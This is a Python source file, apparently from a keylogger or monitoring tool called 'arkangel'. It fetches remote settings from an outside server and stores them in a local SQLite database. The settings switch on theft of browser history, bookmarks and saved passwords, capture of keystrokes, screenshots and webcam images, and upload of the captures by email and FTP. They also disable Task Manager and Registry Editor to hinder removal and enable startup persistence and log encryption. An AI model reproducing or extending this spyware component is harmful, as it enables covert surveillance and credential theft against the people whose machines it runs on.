import sqlite3
import json
import requests

#Đồng bộ xuống
import urllib.request
from getsqldata import *

uid = getCurrentUser();
token = getRowValue('current_user',uid)[1]

download = sqlite3.connect("../database.db")
c = download.cursor()

p = c.execute('select username from Users where id = (select id from current_user)')
p = p.fetchone()[0]
payload = {'user':p,'token':token}
url = "http://www.arkangel.tk/sync-settings-down"
#headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}

r = requests.post(url, data=payload)#, headers=headers)
result = r.content
##result = urllib.request.urlopen(url).read()
result = result.decode('utf-8')
result = json.loads(result)

monitorUser = result['user']

enUser = 0
if(monitorUser['enableAll'] == 1):
    enUser = 1
elif(monitorUser['enableCurrent'] == 1):
    enUser = 2
elif(monitorUser['enableFollowing'] == 1):
    enUser = 3
else:
    enUser = 1
    
try:
    c.execute('update monitor_user set enable = ? where id = ?',(enUser,uid))
except Exception as e:
    print(str(e))
    pass
keywordUser = result['keywordUser']
c.execute('delete from user_list')

for itemKeyword in keywordUser['list']:
    try:
        c.execute('insert into user_list(id,user) values (?,?)',(uid, itemKeyword))
       # print(itemKeyword)
    except Exception as e:
        print(str(e))
        pass

webusage = result['web']
getHist = webusage['enable'] == True and '1' or '0'
getBookmark = webusage['bookmark'] == True and '1' or '0'
getPassword = webusage['password'] == True and '1' or '0'

try:
    c.execute('update webusage set getHistory = ?, getBookmark = ?, getPassword = ? where id = ?',(getHist,getBookmark,getPassword,uid))
except Exception as e:
    print(str(e))
    pass
alert = result['alert']
enableEmail = alert['enableEmail'] == True and '1' or '0'
enableScreenshot = alert['enableScreenshot'] == True and '1' or '0'

try:
    c.execute(  'update Alerts set sendMail = ?, scrShot = ? where id = ?',(enableEmail, enableScreenshot, uid))
except Exception as e:
    print(str(e))
    pass

email = result['email']
enableClear = email['enableClear'] == True and '1' or '0'
enableEmail = email['enableEmail'] == True and '1' or '0'
enableLimit = email['enableLimit'] == True and '1' or '0'
enableUploadImage = email['enableUploadImage'] == True and '1' or '0'
enableUploadKeystroke = email['enableUploadKeystroke'] == True and '1' or '0'
enableUploadWebcam = email['enableUploadWebcam'] == True and '1' or '0'
enableUploadWebsite = email['enableUploadWebsite'] == True and '1' or '0'
enableZip = email['enableZip'] == True and '1' or '0'
hoursEmail = str(email['hoursEmail'])
limitEmail = str(email['limitEmail'])
minutesEmail = str(email['minutesEmail'])
passwordEmail = email['passwordEmail']
passwordZipEmail = email['passwordZipEmail']
portEmail = str(email['portEmail'])
smtpEmail = email['smtpEmail']
subjectEmail = email['subjectEmail']
userEmail = email['userEmail']
sendTo = email['sendTo']
try:
    c.execute(' update EmailDelivery set sendto = ?, smpt = ?, port = ?, uname = ?, password = ?, subject = ? where id = ?',(sendTo, smtpEmail, portEmail, userEmail, passwordEmail, subjectEmail,uid))
    c.execute(' update Email set enable = ?, hours = ?, minutes = ?, upKeystroke = ?, upScrshot = ?, upWebcam = ?, upWebsite = ?, enLimit = ?, limitSize = ?, clear = ?, zipPasswd = ?, enZipPass = ? where id = ?',(enableEmail, hoursEmail, minutesEmail, enableUploadKeystroke, enableUploadImage, enableUploadWebcam, enableUploadWebsite, enableLimit,limitEmail, enableClear, passwordZipEmail, enableZip,uid ))
except Exception as e:
    print(str(e))
    pass
general = result['general']
disableRegistry = general['disableRegistry'] == True and '1' or '0'
disableTaskManager = general['disableTaskManager'] == True and '1' or '0'
enableEncrypt = general['enableEncrypt'] == True and '1' or '0'
enableHotkey = general['enableHotkey'] == True and '1' or '0'
enableStartup = general['enableStartup'] == True and '1' or '0'
hotkeyGeneral = general['hotkeyGeneral']
try:
    c.execute(' update General set disTaskManager = ?, disRegedit = ?, encrlog = ?, startup = ?, hotkey = ?, enHotkey = ? where id = ?',(disableTaskManager,disableRegistry, enableEncrypt, enableStartup, hotkeyGeneral, enableHotkey,uid))
except Exception as e:
    print(str(e))
    pass
screenshot = result['screenshot']
deleteScreenshot = str(screenshot['deleteScreenshot'])
enableDelete = screenshot['enableDelete'] == True and '1' or '0'
enableDouble = screenshot['enableDouble'] == True and '1' or '0'
enableTimestamp = screenshot['enableTimestamp'] == True and '1' or '0'
enableScreenshot = screenshot['enableScreenshot'] == True and '1' or '0'
hoursScreenshot = str(screenshot['hoursScreenshot'])
minutesScreenshot = str(screenshot['minutesScreenshot'])
qualityScreenshot = str(screenshot['qualityScreenshot'])
datetimeScreenshot = str(screenshot['dateDelete'])
try:
    c.execute('update Screenshot set enable = ?, timeNuser = ?,doubleScr = ?, enDel = ?, daysDel = ?, hours = ?,minutes = ?, quality = ?, datetime = ? where id = ?',(enableScreenshot, enableTimestamp, enableDouble, enableDelete, deleteScreenshot, hoursScreenshot, minutesScreenshot, qualityScreenshot, datetimeScreenshot,uid))
except Exception as e:
    print(str(e))
    pass
target = result['target']
enableAll = target['enableAll'] == True and '1' or '0'
enableOnly = target['enableOnly'] == True and '1' or '0'
try:
    c.execute(' update Targets set enAllApp = ?, enFollowApp = ? where id = ?',(enableAll, enableOnly,uid))
except Exception as e:
    print(str(e))
    pass

webcam = result['webcam']
daysWebcam = str(webcam['daysWebcam'])
enableDelete = webcam['enableDelete'] == True and '1' or '0'
enableDeleteUpload = webcam['enableDeleteUpload'] == True and '1' or '0'
enableWebcam = webcam['enableWebcam'] == True and '1' or '0'
hoursWebcam = str(webcam['hoursWebcam'])
minutesWebcam = str(webcam['minutesWebcam'])
datetimeWebcam = str(webcam['dateDelete'])
try:
    c.execute('update Webcam set enable = ?,hours = ?, minutes = ?, enDelEvery = ?, days = ?, enDelAfterUpload = ? , datetime = ? where id = ?',(enableWebcam, hoursWebcam, minutesWebcam,enableDelete, daysWebcam,enableDeleteUpload, datetimeWebcam,uid))
except Exception as e:
    print(str(e))
    pass
ftp = result['ftp']
enableClear = ftp['enableClear'] == True and '1' or '0'
enableFTP = ftp['enableFTP'] == True and '1' or '0'
enableLimit = ftp['enableLimit'] == True and '1' or '0'
enablePassive = ftp['enablePassive'] == True and '1' or '0'
enableUploadImage = ftp['enableUploadImage'] == True and '1' or '0'
enableUploadKeystroke = ftp['enableUploadKeystroke'] == True and '1' or '0'
enableUploadWebcam = ftp['enableUploadWebcam'] == True and '1' or '0'
enableUploadWebsite = ftp['enableUploadWebsite'] == True and '1' or '0'
hostnameFTP = ftp['hostnameFTP']
hoursFTP = str(ftp['hoursFTP'])
limitFTP = str(ftp['limitFTP'])
minutesFTP = str(ftp['minutesFTP'])
passwordFTP = ftp['passwordFTP']
remoteDirFTP = ftp['remoteDirFTP']
userFTP = ftp['userFTP']
try:
    c.execute(' update FTPServer set hostname = ?, uname = ?, password = ?, dir = ?, passiveMode = ? where id = ?',(hostnameFTP, userFTP, passwordFTP, remoteDirFTP, enablePassive,uid))
    c.execute(' update FTP set enable = ?, hours = ?, minutes = ?, upKeystroke = ?, upScrshot = ?, upWebcam = ?, upWebsite = ?, upSize = ?, size = ?, clear = ? where id = ?',(enableFTP, hoursFTP, minutesFTP, enableUploadKeystroke, enableUploadImage, enableUploadWebcam, enableUploadWebsite, enableLimit, limitFTP, enableClear,uid))
except Exception as e:
    print(str(e))
    pass

keywordTarget = result['keywordTarget']
application = keywordTarget['application']
title = keywordTarget['title']
c.execute('delete from TargetList')
length = len(application) > len(title) and len(application) or len(title)
for i in range(1, length + 1):
    if (len(application) >= i):
        itemApplication = str(application[i - 1])
    else:
        itemApplication = '@'

    if (len(title) >= i):
        itemTitle = str(title[i - 1])
    else:
        itemTitle = '@'
    try: 
        c.execute('insert into TargetList(id, byApp, byName) values (?, ?, ?)',(uid, itemApplication, itemTitle))
    except Exception as e:
        print(str(e))
        pass
keywordAlert = result['keywordAlert']
keyword = keywordAlert['list']
c.execute('delete from AlertList')
length = len(keyword)

for i in range(1, length + 1):
    itemKeyword = str(keyword[i - 1])
    try:
        c.execute('insert into AlertList(id,key) values (?,?)',(uid, itemKeyword))
    except Exception as e:
        print(str(e))
        pass


download.commit()
download.close()

